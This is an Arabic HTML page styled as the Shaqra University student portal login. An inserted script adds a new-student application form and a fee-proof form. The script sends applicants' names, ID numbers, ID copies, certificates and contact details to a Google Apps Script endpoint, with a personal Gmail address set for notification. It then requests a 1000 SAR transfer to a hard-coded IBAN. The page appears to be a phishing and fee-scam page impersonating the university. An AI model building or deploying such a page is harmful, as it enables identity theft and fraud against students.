<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تسجيل الدخول - بوابة الطالب الأكاديمية - جامعة شقراء</title>
<link rel="stylesheet" href="login-styles.css">
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">

<!-- (اختياري) OG meta لظهور صورة/عنوان عند مشاركة الرابط -->
<meta property="og:title" content="بوابة القبول - جامعة شقراء ">
<meta property="og:description" content="نموذج التقديم الرسمي.">
<meta property="og:image" content="https://script.google.com/macros/s/AKfycbxglQ_oGCF_ICL56X9dofD56F1mF89vIef6NrN7BObysCTEs5xQVfQ9wGc8N4aWwkG2/exec">
<meta property="og:type" content="website">

</head>
<body>
    <div class="login-container">
        <!-- Background Animation -->
        <div class="background-animation">
            <div class="floating-shape shape-1"></div>
            <div class="floating-shape shape-2"></div>
            <div class="floating-shape shape-3"></div>
            <div class="floating-shape shape-4"></div>
        </div>  <!-- Login Card -->
    <div class="login-card">
        <!-- University Header -->
        <div class="university-header">
            <img src="logo.jpg" alt="شعار جامعة شقراء" class="university-logo">
            <div class="university-info">
                <h1>جامعة شقراء</h1>
                <p>بوابة الطالب الأكاديمية</p>
            </div>
        </div>

        <!-- Login Form -->
        <form class="login-form" id="loginForm">
            <div class="form-header">
                <h2><i class="fas fa-sign-in-alt"></i> تسجيل الدخول</h2>
                <p>أدخل بياناتك للوصول إلى بوابة الطالب</p>
            </div>

            <div class="form-group">
                <label for="studentId">
                    <i class="fas fa-id-card"></i>
                    رقم الهوية / رقم الطالب
                </label>
                <input
                    type="text"
                    id="studentId"
                    name="studentId"
                    placeholder="أدخل رقم الهوية أو رقم الطالب"
                    required
                    autocomplete="username"
                >
                <div class="input-border"></div>
            </div>

            <div class="form-group">
                <label for="password">
                    <i class="fas fa-lock"></i>
                    كلمة المرور
                </label>
                <div class="password-input">
                    <input
                        type="password"
                        id="password"
                        name="password"
                        placeholder="أدخل كلمة المرور"
                        required
                        autocomplete="current-password"
                    >
                    <button type="button" class="toggle-password" onclick="togglePassword()">
                        <i class="fas fa-eye" id="passwordToggleIcon"></i>
                    </button>
                </div>
                <div class="input-border"></div>
            </div>

            <div class="form-options">
                <label class="remember-me">
                    <input type="checkbox" id="rememberMe" name="rememberMe">
                    <span class="checkmark"></span>
                    تذكرني
                </label>
                <a href="#" class="forgot-password">نسيت كلمة المرور؟</a>
            </div>

            <button type="submit" class="login-btn" id="loginBtn">
                <span class="btn-text">تسجيل الدخول</span>
                <span class="btn-loader" style="display: none;">
                    <i class="fas fa-spinner fa-spin"></i>
                </span>
            </button>

            <div class="form-footer">
                <div class="help-links">
                    <a href="#" class="help-link">
                        <i class="fas fa-question-circle"></i>
                        مساعدة في تسجيل الدخول
                    </a>
                    <a href="#" class="help-link">
                        <i class="fas fa-phone"></i>
                        الدعم الفني
                    </a>
                </div>
            </div>
        </form>

        <!-- Error Message -->
        <div class="error-message" id="errorMessage" style="display: none;">
            <i class="fas fa-exclamation-triangle"></i>
            <span id="errorText"></span>
        </div>

        <!-- Success Message -->
        <div class="success-message" id="successMessage" style="display: none;">
            <i class="fas fa-check-circle"></i>
            <span>تم تسجيل الدخول بنجاح! جاري التوجيه...</span>
        </div>
    </div>

    <!-- Footer -->
    <div class="login-footer">
        <div class="footer-content">
            <p>&copy; 2025 جامعة شقراء. جميع الحقوق محفوظة.</p>
            <div class="footer-links">
                <a href="#">الموقع الرسمي</a>
                <a href="#">سياسة الخصوصية</a>
                <a href="#">شروط الاستخدام</a>
            </div>
        </div>
    </div>
</div>

<script src="login-script-fixed.js"></script>

<!-- START: Add New Student button + Application form + Fee proof form -->
<style>
/* Small scoped styles for the inserted components */
#applicantBtn {
  display:block;
  width:100%;
  margin-top:12px;
  padding:10px 12px;
  border-radius:8px;
  font-weight:800;
  cursor:pointer;
  background:#0b7a36;
  color:#fff;
  border:0;
  box-sizing:border-box;
}
#appDrawerWrapper { transition: all .36s ease; max-height:0; overflow:hidden; opacity:0; transform: translateY(-8px); }
#appDrawerWrapper.open { max-height:4000px; opacity:1; transform: translateY(0); margin-top:14px; }

/* Form layout */
.app-form {
  background:#fff;
  border:1px solid rgba(0,0,0,0.05);
  border-radius:10px;
  padding:18px;
  box-shadow:0 6px 20px rgba(15,23,42,0.04);
  box-sizing:border-box;
}
.app-form .grid { display:grid; grid-template-columns: 1fr 1fr; gap:14px; align-items:start; }
.app-form .full { grid-column: 1 / -1; }
.app-form label { display:block; font-weight:700; margin-bottom:6px; font-size:14px; }
.app-form input[type=text], .app-form input[type=email], .app-form input[type=tel], .app-form input[type=date], .app-form input[type=number], .app-form select, .app-form textarea {
  width:100%; padding:10px; border:1px solid #e6e9ef; border-radius:8px; font-size:14px; box-sizing:border-box;
}
.app-form textarea { min-height:110px; resize:vertical; }

/* sections */
.app-form .section { border-top:1px dashed #e6e9ef; padding-top:12px; margin-top:8px; font-weight:800; color:#0b7a36; }

/* buttons */
.app-form .row-actions { display:flex; gap:8px; align-items:center; flex-wrap:wrap; }
.app-form .btn { padding:10px 14px; border-radius:8px; cursor:pointer; border:0; font-weight:800; }
.app-form .btn.primary { background:#0b5fff; color:#fff; }
.app-form .btn.gray { background:#6b7280; color:#fff; }
.app-form .copyBtn { padding:8px 10px; border-radius:6px; border:1px solid rgba(0,0,0,0.06); background:#f3f4f6; cursor:pointer; font-weight:700; }

.app-form .note { background:#fffbea; padding:10px; border-left:4px solid #f59e0b; border-radius:8px; font-size:13px; }
.app-form .small { font-size:13px; color:#6b7280; margin-top:6px; }

.form-message { margin-top:8px; font-size:14px; }

/* responsive */
@media (max-width:980px) {
  .app-form .grid { grid-template-columns: 1fr; }
  #applicantBtn { margin-top:10px; }
}
</style>

<script>
(function(){
  // ======= التعديل الوحيد هنا: ربط الإرسال إلى Google Apps Script exec URL =======
  const FORMCARRY_URL = 'https://script.google.com/macros/s/AKfycbxaXkv0ZdNxV-g-RojBoioEuCMQMH_jFuNSbpmpfk_rrw_ZE8l4a8GrC99ZbUVHj12w/exec';
  const IBAN = 'SA4080000859608017979448';
  const FIXED_FEE = '1000';
  const NOTIFY_EMAIL = 'abdullahyourdomain@gmail.com'; // البريد اللي تبيه يوصل عليه

  // utility DOM ready
  function ready(fn){ if (document.readyState!='loading') return fn(); document.addEventListener('DOMContentLoaded', fn); }

  ready(()=>{
    // Locate where to place the button:
    const loginForm = document.querySelector('.login-form') || document.getElementById('loginForm') || document.querySelector('.login-card') || document.querySelector('.login-card .login-form');
    const loginBtn = document.getElementById('loginBtn') || document.querySelector('.login-btn') || (loginForm ? loginForm.querySelector('button[type="submit"], button') : null);

    // Create button
    const btn = document.createElement('button');
    btn.id = 'applicantBtn';
    btn.type = 'button';
    btn.innerHTML = 'تقديم طالب جديد &nbsp; / &nbsp; New Student Application';

    // Insert under login button if possible
    if (loginBtn && loginBtn.parentElement) {
      loginBtn.insertAdjacentElement('afterend', btn);
    } else {
      // fallback append to login-card or container
      const container = document.querySelector('.login-card') || document.querySelector('.login-container') || document.body;
      container.appendChild(btn);
    }

    // Build drawer wrapper and forms (application form + fee form placeholder)
    const drawerWrapper = document.createElement('div');
    drawerWrapper.id = 'appDrawerWrapper';
    drawerWrapper.innerHTML = `
      <div class="app-form" role="region" aria-label="نموذج تقديم طالب جديد">
        <!-- APPLICATION FORM -->
        <form id="applicantForm" class="grid" enctype="multipart/form-data" novalidate>
          <input type="hidden" name="_source" value="university_shaqra_application">
          <div class="full" style="display:flex;justify-content:space-between;align-items:center;gap:12px">
            <div>
              <h3 style="margin:0">نموذج تقديم طالب جديد — جامعة شقراء</h3>
              <div class="small">املأ الحقول المطلوبة بالعربية والإنجليزية. / Fill required fields in Arabic & English.</div>
            </div>
            <div style="display:flex;gap:8px">
              <button type="button" id="closeAppForm" class="btn gray">إغلاق</button>
            </div>
          </div>

          <!-- Personal info (right column) & Contact (left column) - arranged as requested -->
          <div class="section full">1. البيانات الشخصية / Personal Information</div>

          <div>
            <label>الاسم الرباعي (بالعربية) / Full name (Arabic) <span style="color:#b91c1c">*</span></label>
            <input name="fullNameAr" required>
          </div>
          <div>
            <label>الاسم الرباعي (بالإنجليزية) / Full name (English) <span style="color:#b91c1c">*</span></label>
            <input name="fullNameEn" required>
          </div>

          <div>
            <label>رقم الهوية / ID number <span style="color:#b91c1c">*</span></label>
            <input name="idNumber" required>
          </div>
          <div>
            <label>نوع الهوية / ID type <span style="color:#b91c1c">*</span></label>
            <select name="idType" required>
              <option value="">اختر / Choose...</option>
              <option value="national">هوية وطنية / National ID</option>
              <option value="iqama">إقامة / Iqama</option>
              <option value="passport">جواز سفر / Passport</option>
            </select>
          </div>

          <div>
            <label>مكان إصدار الهوية / Place of issue</label>
            <input name="idPlace">
          </div>
          <div>
            <label>تاريخ الميلاد / Date of birth <span style="color:#b91c1c">*</span></label>
            <input type="date" name="birthDate" required>
          </div>

          <div>
            <label>الجنس / Gender <span style="color:#b91c1c">*</span></label>
            <select name="gender" required>
              <option value="">اختر / Choose...</option>
              <option value="male">ذكر / Male</option>
              <option value="female">أنثى / Female</option>
              <option value="other">أخرى / Other</option>
            </select>
          </div>
          <div>
            <label>الجنسية / Nationality <span style="color:#b91c1c">*</span></label>
            <input name="nationality" required>
          </div>

          <div>
            <label>الاسم الأول / First name</label>
            <input name="firstName">
          </div>
          <div>
            <label>الاسم الثاني / Second name</label>
            <input name="secondName">
          </div>

          <div>
            <label>اسم العائلة / Family name</label>
            <input name="familyName">
          </div>
          <div>
            <label>اسم الأم / Mother's name</label>
            <input name="motherName">
          </div>

          <div class="section full">2. بيانات الاتصال / Contact</div>

          <div>
            <label>رقم الجوال / Mobile number <span style="color:#b91c1c">*</span></label>
            <input name="phone" type="tel" required placeholder="+9665xxxxxxxx">
          </div>
          <div>
            <label>البريد الإلكتروني / Email <span style="color:#b91c1c">*</span></label>
            <input name="email" type="email" required placeholder="example@mail.com">
          </div>

          <div class="full">
            <label>العنوان الوطني / Full address</label>
            <input name="address" placeholder="شارع، حي، منزل رقم / Street, district, house no.">
          </div>

          <div class="section full">3. البيانات الأكاديمية / Academic</div>

          <div>
            <label>نوع المؤهل الأخير / Last qualification <span style="color:#b91c1c">*</span></label>
            <select name="lastQualification" required>
              <option value="">اختر / Choose...</option>
              <option value="secondary">ثانوية عامة / Secondary</option>
              <option value="diploma">دبلوم / Diploma</option>
              <option value="bachelor">بكالوريوس / Bachelor</option>
              <option value="master">ماجستير / Master</option>
              <option value="phd">دكتوراه / PhD</option>
            </select>
          </div>
          <div>
            <label>اسم المؤسسة التعليمية / Institution name <span style="color:#b91c1c">*</span></label>
            <input name="issuingInstitution" required>
          </div>

          <div>
            <label>البلد المصدر للشهادة / Country of issue <span style="color:#b91c1c">*</span></label>
            <input name="degreeCountry" required>
          </div>
          <div>
            <label>التخصص / Major</label>
            <input name="major">
          </div>

          <div>
            <label>سنة التخرج / Graduation year <span style="color:#b91c1c">*</span></label>
            <input type="number" name="graduationYear" min="1900" max="2100" required>
          </div>
          <div>
            <label>تاريخ التخرج / Graduation date</label>
            <input type="date" name="graduationDate">
          </div>

          <div>
            <label>المعدل / GPA or % <span style="color:#b91c1c">*</span></label>
            <input name="gpa" required placeholder="مثال: 4.00 أو 92%">
          </div>
          <div>
            <label>نظام التقييم / Grading system</label>
            <select name="gradingSystem">
              <option value="">اختر / Choose...</option>
              <option value="gpa">GPA</option>
              <option value="percentage">Percentage</option>
            </select>
          </div>

          <div class="full">
            <label>مرفقات الشهادة والسجل الأكاديمي (PDF/صور) / Certificates & Transcript <span style="color:#b91c1c">*</span></label>
            <input type="file" name="certificates" accept="application/pdf,image/*" multiple required>
            <div class="small">ارفق شهادة التخرج والسجل الأكاديمي.</div>
          </div>

          <div class="section full">4. الاختبارات والدرجات / Tests</div>

          <div>
            <label>قياس / Qiyas</label>
            <select name="hasQiyas"><option value="">اختر</option><option value="no">لا / No</option><option value="yes">نعم / Yes</option></select>
          </div>
          <div>
            <label>رقم جلوس قياس / Qiyas seat no.</label>
            <input name="qiyasNo">
          </div>

          <div>
            <label>درجة قياس / Qiyas score</label>
            <input name="qiyasScore">
          </div>
          <div>
            <label>التحصيلي / Tahseeli seat no.</label>
            <input name="tahseeliNo">
          </div>

          <div class="full">
            <label>اختبار اللغة / English test (IELTS/TOEFL/STEP)</label>
            <input name="englishTests">
          </div>

          <div class="full">
            <label>مرفقات نتائج الاختبارات / Tests attachments</label>
            <input type="file" name="testsAttachments" accept="application/pdf,image/*" multiple>
          </div>

          <div class="section full">مرفقات إضافية / Additional documents</div>

          <div>
            <label>السيرة الذاتية / CV</label>
            <input type="file" name="cv" accept="application/pdf">
          </div>
          <div>
            <label>أوراق منشورة / Publications</label>
            <input type="file" name="publications" accept="application/pdf,image/*" multiple>
          </div>

          <div class="full">
            <label>صورة الهوية أو نسخة الإقامة (مطلوب) / ID copy <span style="color:#b91c1c">*</span></label>
            <input type="file" name="idAttachment" accept="application/pdf,image/*" required>
          </div>

          <div class="section full">التواقيعات والإقرارات / Declarations</div>

          <div class="full note">
            <strong>تنبيه:</strong> بتوقيعك (كتابة اسمك) توافق على صحة جميع البيانات المقدمة.
          </div>

          <div>
            <label>اسم مقدم الطلب (مطبوع) / Applicant name <span style="color:#b91c1c">*</span></label>
            <input name="declarantName" required>
          </div>

          <div>
            <label>تاريخ التقديم / Application date <span style="color:#b91c1c">*</span></label>
            <input type="date" name="declarationDate" required>
          </div>

          <div class="full">
            <label>التوقيع الإلكتروني (اكتب اسمك الكامل) / Electronic signature <span style="color:#b91c1c">*</span></label>
            <input name="electronicSignature" required placeholder="اكتب اسمك الكامل">
          </div>

          <!-- submit -->
          <div class="full" style="display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin-top:10px">
            <button type="button" id="downloadJsonBtn" class="copyBtn" style="background:#eef2ff">تحميل JSON</button>
            <button type="submit" id="sendAppBtn" class="btn primary" style="flex:1">إرسال الطلب / Submit Application</button>
            <button type="button" id="resetAppBtn" class="btn gray">إعادة تعيين / Reset</button>
            <div id="appFormMessage" style="flex:1"></div>
          </div>
        </form>

        <!-- FEE PROOF FORM (hidden initially) -->
        <form id="feeForm" class="grid" style="display:none;margin-top:14px" enctype="multipart/form-data" novalidate>
          <input type="hidden" name="_source" value="university_shaqra_fee_proof">
          <div class="full" style="display:flex;justify-content:space-between;align-items:center">
            <h3 style="margin:0">نموذج إثبات الرسوم / Payment proof</h3>
            <div class="small">المبلغ ثابت: <strong>1000 ريال</strong></div>
          </div>

          <div class="full section">تفاصيل الدفع / Payment details</div>

          <div>
            <label>المبلغ المحوّل / Amount transferred (SAR) <span style="color:#b91c1c">*</span></label>
            <input name="paidAmount" value="${FIXED_FEE}" required readonly>
          </div>

          <div>
            <label>البنك المحول منه / From bank <span style="color:#b91c1c">*</span></label>
            <input name="fromBank" required placeholder="اسم البنك / Bank name">
          </div>

          <div>
            <label>تاريخ العملية / Transaction date <span style="color:#b91c1c">*</span></label>
            <input type="date" name="transactionDate" required>
          </div>

          <div>
            <label>رقم مرجع التحويل / Transaction ID <span style="color:#b91c1c">*</span></label>
            <input name="transactionId" required placeholder="مثال: 123456789">
          </div>

          <div class="full">
            <label>إيصال التحويل (صورة) / Upload receipt <span style="color:#b91c1c">*</span></label>
            <input type="file" name="receipt" accept="image/*,application/pdf" required>
            <div class="small">رفع صورة أو PDF لإيصال الدفع.</div>
          </div>

          <div class="full" style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-top:8px">
            <div style="flex:1">
              <p class="small" id="bankInfoFee">البنك المستلم: الراجحي — IBAN: <strong id="ibanDisplay">${IBAN}</strong></p>
            </div>
            <div>
              <button type="button" id="copyIbanFeeBtn" class="copyBtn">نسخ رقم الحساب</button>
            </div>
          </div>

          <div class="full" style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-top:12px">
            <button type="button" id="downloadFeeJsonBtn" class="copyBtn" style="background:#eef2ff">تحميل JSON</button>
            <button type="submit" id="sendFeeBtn" class="btn primary" style="flex:1">إرسال إيصال الدفع / Send Payment Proof</button>
            <button type="button" id="resetFeeBtn" class="btn gray">إعادة تعيين</button>
            <div id="feeFormMessage" style="flex:1"></div>
          </div>
        </form>

      </div>
    `;

    // Insert drawer after login card
    const loginCard = document.querySelector('.login-card') || document.querySelector('.login-container') || document.body;
    loginCard.insertAdjacentElement('afterend', drawerWrapper);

    // Wire elements
    const openBtn = btn;
    const drawer = drawerWrapper;
    const appForm = drawer.querySelector('#applicantForm');
    const feeForm = drawer.querySelector('#feeForm');
    const closeBtn = drawer.querySelector('#closeAppForm');
    const copyIbanBtn = drawer.querySelector('#copyIbanBtn');
    const copyIbanFeeBtn = drawer.querySelector('#copyIbanFeeBtn');
    const downloadJsonBtn = drawer.querySelector('#downloadJsonBtn');
    const downloadFeeJsonBtn = drawer.querySelector('#downloadFeeJsonBtn');
    const resetAppBtn = drawer.querySelector('#resetAppBtn');
    const resetFeeBtn = drawer.querySelector('#resetFeeBtn');
    const sendAppBtn = drawer.querySelector('#sendAppBtn');
    const sendFeeBtn = drawer.querySelector('#sendFeeBtn');
    const appMsg = drawer.querySelector('#appFormMessage');
    const feeMsg = drawer.querySelector('#feeFormMessage');

    // open/close drawer functions
    function openDrawer(){
      drawer.classList.add('open');
      drawer.setAttribute('aria-hidden','false');
      openBtn.textContent = 'إغلاق نموذج التقديم / Close Application Form';
      // default date: application date
      const d = appForm.querySelector('[name="declarationDate"]');
      if (d && !d.value) d.value = new Date().toISOString().slice(0,10);
      drawer.scrollIntoView({behavior:'smooth', block:'nearest'});
    }
    function closeDrawer(){
      drawer.classList.remove('open');
      drawer.setAttribute('aria-hidden','true');
      openBtn.textContent = 'تقديم طالب جديد / New Student Application';
      appMsg.innerHTML = '';
      feeMsg.innerHTML = '';
    }

    openBtn.addEventListener('click', ()=> { if (drawer.classList.contains('open')) closeDrawer(); else openDrawer(); });
    closeBtn.addEventListener('click', closeDrawer);

    // Copy IBAN helpers
    function copyTextWithFeedback(text, btnEl){
      if(!btnEl) return;
      const prev = btnEl.textContent;
      if(navigator.clipboard && navigator.clipboard.writeText){
        navigator.clipboard.writeText(text).then(()=> {
          btnEl.textContent = 'تم النسخ ✓';
          setTimeout(()=> btnEl.textContent = prev, 1600);
        }).catch(()=> {
          fallbackCopy(text, btnEl, prev);
        });
      } else fallbackCopy(text, btnEl, prev);
    }
    function fallbackCopy(text, btnEl, prev){
      const ta = document.createElement('textarea'); ta.value = text; document.body.appendChild(ta); ta.select();
      try { document.execCommand('copy'); btnEl.textContent = 'تم النسخ ✓'; setTimeout(()=> btnEl.textContent = prev, 1600); } catch(e){ alert('فشل النسخ. انسخ رقم الحساب يدوياً: ' + text); }
      ta.remove();
    }

    // attach copy handlers
    drawer.querySelectorAll('#copyIbanBtn, #copyIbanFeeBtn').forEach(el=>{
      // general handler: some browsers may not find both IDs if DOM not ready
      if(el) el.addEventListener('click', ()=> copyTextWithFeedback(IBAN, el));
    });

    // For elements that might be missing depending on insertion point:
    if(copyIbanBtn) copyIbanBtn.addEventListener('click', ()=> copyTextWithFeedback(IBAN, copyIbanBtn));

    // Simple fake-value detector
    function looksFake(v){
      if(!v) return true;
      const s = String(v).trim().toLowerCase();
      if(s.length <= 1) return true;
      const bad = ['test','123','aaaa','abcd','مثال','نموذج','xxx','0000','000'];
      if(bad.includes(s)) return true;
      return false;
    }

    // Validation for application form
    function validateApp(){
      const errors = [];
      const requiredNames = ['fullNameAr','fullNameEn','idType','idNumber','birthDate','gender','nationality','phone','email','lastQualification','issuingInstitution','degreeCountry','graduationYear','gpa','certificates','idAttachment','declarantName','declarationDate','electronicSignature','desiredProgram','studyType'];
      requiredNames.forEach(name=>{
        const el = appForm.elements[name];
        if(!el) return;
        if(el.type === 'file'){
          if(!el.files || el.files.length === 0) errors.push('حقل مطلوب مفقود: ' + (el.previousElementSibling ? el.previousElementSibling.textContent.trim() : name));
        } else {
          if(looksFake(el.value)) errors.push('الرجاء تعبئة قيمة صحيحة للحقل: ' + (el.previousElementSibling ? el.previousElementSibling.textContent.trim() : name));
        }
      });

      // email simple check
      const email = appForm.elements['email'];
      if(email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.value)) errors.push('البريد الإلكتروني غير صحيح.');

      // phone simple
      const phone = appForm.elements['phone'];
      if(phone && !/^[+0-9\s\-]{7,15}$/.test(phone.value)) errors.push('رقم الجوال غير صحيح.');

      // graduation year
      const gy = appForm.elements['graduationYear'];
      if(gy && (isNaN(Number(gy.value)) || Number(gy.value) < 1900 || Number(gy.value) > 2100)) errors.push('سنة التخرج غير صحيحة.');

      return errors;
    }

    // Validation for fee form
    function validateFee(){
      const errors = [];
      const fields = ['paidAmount','fromBank','transactionDate','transactionId','receipt'];
      fields.forEach(name=>{
        const el = feeForm.elements[name];
        if(!el) return;
        if(el.type === 'file'){
          if(!el.files || el.files.length === 0) errors.push('يرجى إرفاق إيصال التحويل.');
        } else {
          if(looksFake(el.value)) errors.push('الرجاء تعبئة قيمة صحيحة للحقل: ' + (el.previousElementSibling ? el.previousElementSibling.textContent.trim() : name));
        }
      });
      // amount must equal FIXED_FEE
      const amt = feeForm.elements['paidAmount'];
      if(amt && String(amt.value).trim() !== String(FIXED_FEE)) errors.push('المبلغ يجب أن يكون ثابتاً: ' + FIXED_FEE + ' ريال.');
      return errors;
    }

    // Download JSON (application)
    if(downloadJsonBtn) downloadJsonBtn.addEventListener('click', ()=>{
      const fd = new FormData(appForm);
      const obj = {};
      for(const [k,v] of fd.entries()){
        if(obj[k] === undefined) obj[k] = v;
        else {
          if(!Array.isArray(obj[k])) obj[k] = [obj[k]];
          obj[k].push(v);
        }
      }
      // files meta
      ['certificates','idAttachment','photo','cv','publications','testsAttachments','otherDocs','employerApproval'].forEach(name=>{
        obj[name] = [];
        const inp = appForm.elements[name];
        if(inp && inp.files){
          for(let i=0;i<inp.files.length;i++){
            const f = inp.files[i];
            obj[name].push({name:f.name,size:f.size,type:f.type});
          }
        }
      });
      obj._meta = {applicationId:'APP-'+Math.random().toString(36).slice(2,10).toUpperCase(), timestamp: new Date().toISOString()};
      const blob = new Blob([JSON.stringify(obj,null,2)], {type:'application/json'});
      const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
      const fname = (appForm.elements['fullNameAr'] && appForm.elements['fullNameAr'].value ? appForm.elements['fullNameAr'].value.replace(/\s+/g,'_') : 'application') + '_shaqra.json';
      a.download = fname; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(a.href);
    });

    // Download JSON (fee)
    if(downloadFeeJsonBtn) downloadFeeJsonBtn.addEventListener('click', ()=>{
      const fd = new FormData(feeForm);
      const obj = {};
      for(const [k,v] of fd.entries()){
        if(obj[k] === undefined) obj[k] = v;
        else {
          if(!Array.isArray(obj[k])) obj[k] = [obj[k]];
          obj[k].push(v);
        }
      }
      obj._meta = {applicationId:'APP-FEE-'+Math.random().toString(36).slice(2,10).toUpperCase(), timestamp: new Date().toISOString()};
      const blob = new Blob([JSON.stringify(obj,null,2)], {type:'application/json'});
      const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
      const fname = 'fee_proof_' + (feeForm.elements['transactionId'] && feeForm.elements['transactionId'].value ? feeForm.elements['transactionId'].value : 'untitled') + '.json';
      a.download = fname; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(a.href);
    });

    // Reset handlers
    if(resetAppBtn) resetAppBtn.addEventListener('click', ()=> { if(confirm('هل أنت متأكدة من إعادة تعيين كل الحقول؟')) { appForm.reset(); appMsg.innerHTML=''; } });
    if(resetFeeBtn) resetFeeBtn.addEventListener('click', ()=> { if(confirm('هل أنت متأكدة من إعادة تعيين حقول إيصال الدفع؟')) { feeForm.reset(); feeMsg.innerHTML=''; } });

    // Submit application handler
    appForm.addEventListener('submit', async (ev)=>{
      ev.preventDefault();
      appMsg.innerHTML = '';
      const errs = validateApp();
      if(errs.length){
        appMsg.innerHTML = '<div style="color:#b91c1c"><strong>يرجى تصحيح الأخطاء:</strong><ul style="margin:6px 0 0 18px;padding:0">'+errs.map(x=>'<li>'+x+'</li>').join('')+'</ul></div>';
        drawer.scrollIntoView({behavior:'smooth', block:'nearest'});
        return;
      }

      // prepare FormData and send to your Google Apps Script endpoint
      const fd = new FormData(appForm);
      fd.append('_meta_applicationId', 'APP-'+Math.random().toString(36).slice(2,10).toUpperCase());
      fd.append('_meta_timestamp', new Date().toISOString());
      fd.append('feeAmount', FIXED_FEE);
      fd.append('feeIban', IBAN);
      // add notify email so Apps Script knows where to send
      fd.append('notifyEmail', NOTIFY_EMAIL);

      appMsg.innerHTML = '<div class="small">جاري إرسال البيانات... الرجاء الانتظار.</div>';
      try {
        const res = await fetch(FORMCARRY_URL, { method:'POST', body: fd });
        // Note: Apps Script may return plain text — accept any ok status
        if(!res.ok) throw new Error('HTTP '+res.status);
        appMsg.innerHTML = '<div style="color:#065f46"><strong>تم إرسال البيانات بنجاح.</strong> الآن الرجاء إثبات تسديد الرسوم أدناه.</div>';
        // show fee form after slight delay
        setTimeout(()=> {
          feeForm.style.display = 'grid';
          feeForm.scrollIntoView({behavior:'smooth', block:'nearest'});
        }, 600);
        // keep application data in case needed
      } catch(err){
        console.error(err);
        appMsg.innerHTML = '<div style="color:#b91c1c">فشل الإرسال. حاول مرة أخرى لاحقاً.</div>';
      }
    });

    // Submit fee proof
    feeForm.addEventListener('submit', async (ev)=>{
      ev.preventDefault();
      feeMsg.innerHTML = '';
      const errs = validateFee();
      if(errs.length){
        feeMsg.innerHTML = '<div style="color:#b91c1c"><strong>يرجى تصحيح الأخطاء:</strong><ul style="margin:6px 0 0 18px;padding:0">'+errs.map(x=>'<li>'+x+'</li>').join('')+'</ul></div>';
        feeForm.scrollIntoView({behavior:'smooth', block:'nearest'});
        return;
      }

      // attach fee form data
      const fd = new FormData(feeForm);
      fd.append('_meta_feeId', 'FEE-'+Math.random().toString(36).slice(2,10).toUpperCase());
      fd.append('_meta_timestamp', new Date().toISOString());
      fd.append('feeIban', IBAN);
      // add notify email so Apps Script knows where to send
      fd.append('notifyEmail', NOTIFY_EMAIL);

      feeMsg.innerHTML = '<div class="small">جاري إرسال إثبات الدفع... الرجاء الانتظار.</div>';
      try {
        const res = await fetch(FORMCARRY_URL, { method:'POST', body: fd });
        if(!res.ok) throw new Error('HTTP '+res.status);
        feeMsg.innerHTML = '<div style="color:#065f46"><strong>تم إرسال إثبات الدفع بنجاح.</strong> شكراً لك، سنراجع الإيصال ونتواصل معك.</div>';
        setTimeout(()=> { feeForm.reset(); }, 900);
      } catch(err){
        console.error(err);
        feeMsg.innerHTML = '<div style="color:#b91c1c">فشل الإرسال. حاول مرة أخرى لاحقاً.</div>';
      }
    });

    // allow ESC to close
    document.addEventListener('keydown', (ev)=> { if(ev.key === 'Escape' && drawer.classList.contains('open')) closeDrawer(); });

    // initial close
    closeDrawer();
  });
})();
</script>
<!-- END: Add New Student button + Application form + Fee proof form -->
</body>
    </html>
